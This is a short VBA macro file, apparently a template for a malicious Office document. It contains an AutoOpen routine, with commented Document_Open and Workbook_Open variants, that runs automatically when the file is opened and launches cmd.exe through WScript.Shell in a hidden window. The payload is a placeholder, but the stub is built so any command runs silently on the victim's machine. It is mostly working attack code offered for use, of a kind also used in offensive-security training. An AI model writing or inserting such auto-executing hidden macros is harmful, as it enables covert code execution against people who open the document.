'Sub Document_Open()
'    MyMacro
'End Sub
' use Private Sub Workbook_Open() for excels
Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    ' Shell str, vbHide
    ' or
    CreateObject("Wscript.Shell").Run str, 0
End Sub
